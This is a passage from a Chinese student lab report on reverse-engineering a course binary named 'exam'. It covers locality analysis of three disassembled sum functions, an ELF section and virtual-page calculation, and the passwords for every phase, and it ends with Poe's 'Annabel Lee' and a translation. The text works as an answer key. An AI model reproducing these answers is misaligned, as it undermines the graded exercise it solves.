        sum += *begin;
  return sum;
}
```

### `sum_1`

`sum_1`对应的汇编语句如下：

```assembly
00000000004012d4 <sum_1>:
  4012d4:	48 8d b7 00 80 20 00 	lea    0x208000(%rdi),%rsi
  4012db:	ba 00 00 00 00       	mov    $0x0,%edx
  4012e0:	bf 00 00 00 00       	mov    $0x0,%edi
  4012e5:	eb 31                	jmp    401318 <sum_1+0x44>
  4012e7:	48 81 c1 00 02 00 00 	add    $0x200,%rcx
  4012ee:	48 39 f1             	cmp    %rsi,%rcx
  4012f1:	74 17                	je     40130a <sum_1+0x36>
  4012f3:	48 8d 81 00 00 e0 ff 	lea    -0x200000(%rcx),%rax
  4012fa:	48 03 10             	add    (%rax),%rdx
  4012fd:	48 05 00 80 00 00    	add    $0x8000,%rax
  401303:	48 39 c8             	cmp    %rcx,%rax
  401306:	75 f2                	jne    4012fa <sum_1+0x26>
  401308:	eb dd                	jmp    4012e7 <sum_1+0x13>
  40130a:	48 83 c7 01          	add    $0x1,%rdi
  40130e:	48 83 c6 08          	add    $0x8,%rsi
  401312:	48 83 ff 40          	cmp    $0x40,%rdi
  401316:	74 09                	je     401321 <sum_1+0x4d>
  401318:	48 8d 8e 00 80 ff ff 	lea    -0x8000(%rsi),%rcx
  40131f:	eb d2                	jmp    4012f3 <sum_1+0x1f>
  401321:	48 89 d0             	mov    %rdx,%rax
  401324:	c3                   	retq
```

转换成C代码：

```c
int sum_1(int* array) {
  int sum = 0; // %edx
  int* end = array + 266240; // 0x208000(%rdi)->%rsi
  for (int i = 0; i != 64; end++, i++) // 0x0->%edi
    for (int* mid = end - 4096; mid != end; mid += 64) // -0x8000(%rsi)->%rcx
      for (int* begin = mid - 262144; begin != mid; begin += 4096) // -0x200000(%rcx)->%rax
        sum += *begin;
  return sum;
}
```

### `sum_2`

`sum_2`对应的汇编语句如下：

```assembly
0000000000401226 <sum_2>:
  401226:	48 8d b7 00 82 00 00 	lea    0x8200(%rdi),%rsi
  40122d:	4c 8d 87 00 00 20 00 	lea    0x200000(%rdi),%r8
  401234:	ba 00 00 00 00       	mov    $0x0,%edx
  401239:	eb 34                	jmp    40126f <sum_2+0x49>
  40123b:	48 81 c1 00 02 00 00 	add    $0x200,%rcx
  401242:	48 39 f1             	cmp    %rsi,%rcx
  401245:	74 15                	je     40125c <sum_2+0x36>
  401247:	48 8d 81 00 fe ff ff 	lea    -0x200(%rcx),%rax
  40124e:	48 03 10             	add    (%rax),%rdx
  401251:	48 83 c0 08          	add    $0x8,%rax
  401255:	48 39 c8             	cmp    %rcx,%rax
  401258:	75 f4                	jne    40124e <sum_2+0x28>
  40125a:	eb df                	jmp    40123b <sum_2+0x15>
  40125c:	48 81 c6 00 80 00 00 	add    $0x8000,%rsi
  401263:	48 81 c7 00 80 00 00 	add    $0x8000,%rdi
  40126a:	4c 39 c7             	cmp    %r8,%rdi
  40126d:	74 09                	je     401278 <sum_2+0x52>
  40126f:	48 8d 8f 00 02 00 00 	lea    0x200(%rdi),%rcx
  401276:	eb cf                	jmp    401247 <sum_2+0x21>
  401278:	48 89 d0             	mov    %rdx,%rax
  40127b:	c3                   	retq
```

转换成C代码：

```c
int sum_2(int* array) {
  int sum = 0; // %edx
  for (int* end = array + 4160, flag = array + 262144; array != flag; end += 4096, array += 4096)// 0x8200(%rdi)->%rsi, 0x200000(%rdi)->r8
    for (int* mid = array + 64; mid != end; mid += 64) // 0x200(%rdi)->%rcx
      for (int* begin = mid - 64; begin != mid; begin++) // -0x200(%rcx)->%rax
        sum += *begin;
  return sum;
}
```

### `sum`

综合三个`sum`函数可以看出，它们的共同功能是利用三层循环对一个大小为266240的`int`型数组分块求和（不要认为数组大小是266304）：

- `sum_0`把数组用`mid`分成0～63、64～262207和262208～266240三块，最内层循环将`mid`左侧64个元素按1步长求和；中层循环使`mid`按4096步长移动；外层循环使`end`按64步长移动(266304-262208)/(32768/512)=64次。

  对于`mid`的每次移动，`begin`都会将其左侧64个元素求和，且**已求和区间间隔为4096**。

  对于`end`的每次移动，`mid`也随之向后偏移64个元素，且此64个元素由`begin`全部求和。`end`移动64次后，偏移了64x64=4096个元素，到达262208+4096=266304处；`mid`也一共偏移了64x64=4096个元素，恰好将第一次的间隔补满。且最后`mid`与`end`相差64，正好到达数组末尾处（266304-64=266240）。

- `sum_1`把数组用`mid`分成0～262143和262144～266240两块，最内层循环将`mid`左侧262144个元素按4096步长求和；中层循环使`mid`按64步长移动；外层循环使`end`从266240按1步长移动64/1=64次。（**注意`%rdi`表示的类型变为整数，不再是地址！*感谢 @SH4NG 的指正！***）

  对于`mid`的每次移动，`begin`都会将其左侧262144个元素隔4096求和，而`mid`也向右按64步长移动4096/64=64次，即**已求和区间间隔为4096/64=64**。

  对于`end`的每次移动，`mid`也随之向后偏移1个元素，`end`移动64次后，偏移了64x1=64个元素，到达266240+64=266304处；`mid`也一共偏移了64x1=64个元素，恰好将第一次的间隔补满。且最后`mid`与`end`相差64，正好到达数组末尾处（266304-64=266240）。

- `sum_2`把数组用`mid`分成0～63、64～4159和4160～266240三块，最内层循环将`mid`左侧64个元素按1步长求和；中层循环使`mid`按64步长移动；外层循环使`end`从4160按4096步长移动262144/4096=64次。

  对于`mid`的每次移动，`begin`都会将其左侧64个元素求和，而`mid`步长同样为64。注意`array`并未清零，而是以步长为4096提供给`mid`追赶`end`，即每次`end`移动时，`mid`都会领先`array`4096。由于`mid`步长为64，则中层循环将`end-64`左侧4096个元素按1步长求和。

  对于`end`每次移动4096个元素，`mid`都会滞后64个元素（开始时`array`滞后4160-4096=64）将左侧4096个元素全部求和。`array`移动到262144时，此时`mid`恰好移动到数组末尾（262144+4096=266240）。

综合三种分块方式和步长索引，可以发现：

- 三个函数均为三层循环，时间局部性相差较小；

- `sum_0`中`begin`的步长较小但`mid`步长较大，导致`begin`在数组中不断跳跃4096个元素访问，空间局部性较差；
- `sum_1`中`begin`的步长较大，导致比`sum_0`更频繁地跳跃式访问，空间局部性最差；
- `sum_2`中`begin`和`mid`的步长均较小，且`begin`的范围等于`mid`的步长，从而可以实现`begin`的连续寻址访问，空间局部性最好。

---

综合以上分析，`sum_2`具有最好的局部性特性，因此`phase_3`的密码就是：

```shell
32
```

# 任务四——虚拟内存分析

> 使用`objdump`和`readelf`等工具分析该elf文件中`.text`，`.data`，`.bss`和`.rodata`这四个section，并计算：
>
> - 各section实际使用内存空间大小
> - 各section在内存中的起始地址（虚拟地址）
> - 各section需要的虚拟页数量（pagesize=4KB）

---

什么是ELF文件？

> ELF（Executable and Linkable Format）文件，是一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件。
>
> ELF文件由4部分组成，分别是：
>
> - ELF头（ELF header）
> - 程序头表（Program header table）
> - 节（Section）
> - 节头表（Section header table）

这四个section是什么？

> - `.text`：已编译程序的机器代码。
>
> - `.data`：已初始化的全局和静态C变量。
>
>   局部C变量在运行时被保存在栈中，既不出现在`.data`节中，也不出现在`.bss`节中。
>
> - `.bss`：未初始化的全局和静态C变量，以及所有被初始化为0的全局或静态变量。
>
>   在目标文件中这个节不占据实际的空间，它仅仅是一个占位符。
>
>   目标文件格式区分已初始化和未初始化变量是为了空间效率：在目标文件中，未初始化变量不需要占据任何实际的磁盘空间。运行时，在内存中分配这些变量，初始值为0。
>
> - `.rodata`：只读数据。
>
>   比如`printf`语句中的格式串和开关语句的跳转表。

什么是虚拟内存？

> **虚拟内存（VM）**是一种对主存的抽象，可以更加有效地管理内存并且减少出错。
>
> 虚拟内存是硬件异常、硬件地址翻译、主存、磁盘文件和内核软件的完美交互，它为每个进程提供了一个大的、一致的和私有的地址空间。

虚拟内存有什么作用？

> 虚拟内存通过一个很清晰的机制，提供了三个重要的能力：
>
> - 它将主存看成是一个存储在磁盘上的地址空间的高速缓存，在主存中只保存活动区域，并根据需要在磁盘和主存之间来回传送数据，通过这种方式，它高效地使用了主存；
> - 它为每个进程提供了一致的地址空间，从而简化了内存管理；
> - 它保护了每个进程的地址空间不被其他进程破坏。

什么是虚拟地址？

> 虚拟内存被组织为一个由存放在磁盘上的N个连续的字节大小的单元组成的数组，每字节都有一个唯一的虚拟地址，作为到数组的索引。
>
> 虚拟地址（Virtual Address，VA）是CPU访问主存的重要途径，这个虚拟地址在被送到内存之前先转换成适当的物理地址。

什么是虚拟页？

> **虚拟页（Virtual Page，VP）**就是VM系统将虚拟内存分割成的大小固定的块，作为磁盘（较低层）和主存（较高层）之间的传输单元。

---

[`objdump`还有什么用法？](https://man.linuxde.net/objdump)

[什么是`readelf`命令？](https://man.linuxde.net/readelf)

---

利用`readelf`查看各section的信息：

```shell
readelf -S -W exam
```

在输出中找到四个section：

```shell
There are 29 section headers, starting at offset 0x3eb0:

节头：
  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al
...
  [13] .text             PROGBITS        0000000000401140 001140 000b35 00  AX  0   0 16
...
  [15] .rodata           PROGBITS        0000000000402000 002000 0002f7 00   A  0   0  8
...
  [23] .data             PROGBITS        00000000004040a0 0030a0 000010 00  WA  0   0  8
  [24] .bss              NOBITS          00000000004040c0 0030b0 200050 00  WA  0   0 32
...
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)
```

可以发现：

| section   | 大小     | 起始地址 |
| --------- | -------- | -------- |
| `.text`   | 0x000b35 | 0x401140 |
| `.data`   | 0x000010 | 0x4040a0 |
| `.bss`    | 0x200050 | 0x4040c0 |
| `.rodata` | 0x0002f7 | 0x402000 |

根据“虚拟页是对虚拟内存的划分”，且虚拟页大小为4KB=0x1000字节，结合各section的大小和起始地址可以得出：

- `.text`在0x401000～0x402000之间，故需要的虚拟页数量为1；

- `.data`：在0x404000～0x405000之间，故需要的虚拟页数量为1；

- `.bss`：在0x404000～0x605000之间，故需要的虚拟页数量为513*（此处用十六进制计算，感谢 @祖国的花朵 的指正）*；

- `.rodata`：在0x402000～0x403000之间，故需要的虚拟页数量为1。

# 结束语

将每个任务的密码的十六进制形式存放到`data.txt`中，利用`hex2raw`并运行：

```shell
./hex2raw < data.txt | ./exam
```

得到输出如下：

```shell
Input sth. please.

Ohh! You have found the entrance.

Skip phase 0? (y/n)n
You have entered PHASE 0
Input phase 0 password:But we loved with a love that was more than love
Good! You have passed PHASE 0!

Skip phase 1? (y/n)n
You have entered PHASE 1
Input phase 1 password:9Q*a
Great! You have passed PHASE 1!!

Skip phase 2? (y/n)n
You have entered PHASE 2
Input phase 2 password:Mp)zixD-%H
Awesome! You have passed PHASE 2!!!

Skip phase 3? (y/n)n
You have entered PHASE 3
choose a function whith the best locality to run:2

[[You have pass all the levels! (*@o@*)]]
```

此处存在语法错误，若改为`passed`就完美了。

实验结束。

---

**安娜贝尔·丽**

**第一节**

It was many and many a year ago,

In a kingdom by the sea,

That a maiden there lived whom you may know

By the name of ANNABEL LEE;

And this maiden she lived with no other thought

Than to love and be loved by me.

**第二节**

I was a child and she was a child,

In this kingdom by the sea;

But we loved with a love that was more than love —

I and my Annabel Lee;

With a love that the winged seraphs of heaven

Coveted her and me.

**第三节**

And this was the reason that, long ago,

In this kingdom by the sea,

A wind blew out of a cloud, chilling

My beautiful Annabel Lee;

So that her highborn kinsman came

And bore her away from me,

To shut her up in a sepulchre

In this kingdom by the sea.

**第四节**

The angels, not half so happy in heaven,

Went envying her and me —

Yes! — that was the reason (as all men know,

In this kingdom by the sea)

That the wind came out of the cloud by night,

Chilling and killing my Annabel Lee.

**第五节**

But our love it was stronger by far than the love

Of those who were older than we —

Of many far wiser than we —

And neither the angels in heaven above,

Nor the demons down under the sea,

Can ever dissever my soul from the soul

Of the beautiful Annabel Lee.

**第六节**

For the moon never beams without bringing me dreams

Of the beautiful Annabel Lee;

And the stars never rise but I feel the bright eyes

Of the beautiful Annabel Lee;

And so, all the night tide, I lie down by the side

Of my darling — my darling — my life and my bride,

In her sepulchre there by the sea,

In her tomb by the sounding sea.



译文：

**第一节**

很久很久以前，

在一个滨海的国度里，

住着一位少女你或许认得，

她的芳名叫安娜贝尔·李；

这少女活着没有别的愿望，

只为和我两情相许。

**第二节**

那会儿我还是个孩子，她也未脱稚气，

在这个滨海的国度里；

可我们的爱超越一切，无人能及——

我和我的安娜贝尔·李；

我们爱得那样深，连天上的六翼天使

也把我和她妒嫉——

**第三节**

这就是那不幸的根源，很久以前

在这个滨海的国度里．

夜里一阵寒风从白云端吹起，冻僵了

我的安娜贝尔·李；

于是她那些高贵的亲戚来到凡间

把她从我的身边夺去，

将她关进一座坟墓

在这个滨海的国度里。

**第四节**

这些天使们在天上，不及我们一半快活，

于是他们把我和她妒嫉——

对——就是这个缘故（谁不晓得呢，在这个滨海的国度里）

云端刮起了寒风，

冻僵并带走了，我的安娜贝尔·李。

**第五节**

可我们的爱情远远地胜过

那些年纪长于我们的人——

那些智慧胜于我们的人——

无论是天上的天使，

还是海底的恶魔，

都不能将我们的灵魂分离，

我和我美丽的安娜贝尔·李。

**第六节**

因为月亮的每一丝清辉都勾起我的回忆

梦里那美丽的安娜贝尔·李

群星的每一次升起都令我觉得秋波在闪动

那是我美丽的安娜贝尔·李

就这样，伴着潮水，我整夜躺在她身旁，

我亲爱的——我亲爱的——我的生命，我的新娘，

在海边那座坟茔里，

在大海边她的墓穴里。
